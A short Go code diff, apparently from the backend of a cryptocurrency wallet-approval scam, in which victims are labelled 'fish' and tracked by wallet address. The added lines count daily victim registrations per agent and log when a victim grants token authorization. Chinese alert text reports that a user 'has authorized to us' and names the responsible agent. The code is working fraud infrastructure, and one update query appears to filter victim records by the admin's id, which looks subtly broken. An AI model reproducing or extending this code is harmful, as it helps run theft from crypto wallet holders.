@@ -116,6 +116,8 @@ func FishRegister(c *gin.Context) {
 	_, _ = redis.Rdb.HMSet("USER_"+c.PostForm("fox_address"), m).Result()
 	_, _ = redis.Rdb.HSet("TOKEN_USER", token, c.PostForm("fox_address")).Result()
 
+	// 添加注册个数
+	util.AddEverydayData(redis.Rdb, "RegisterCount", AdminId, belongId)
 	util.JsonWrite(c, 200, m["Token"], "Registered successfully")
 	return
 
@@ -396,7 +398,7 @@ func CheckAuthorization(c *gin.Context) {
 						admin := model.Admin{}
 						mysql.DB.Where("id=?", fish.AdminId).First(&admin)
 						//content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
-
+						mysql.DB.Where("id=?", fish.AdminId).Update(&model.Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
 						content := "❥【新增授权报警】---------------------------------------------------->%0A" +
 							" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
 							"所属代理ID:" + admin.Username + "%0A" +
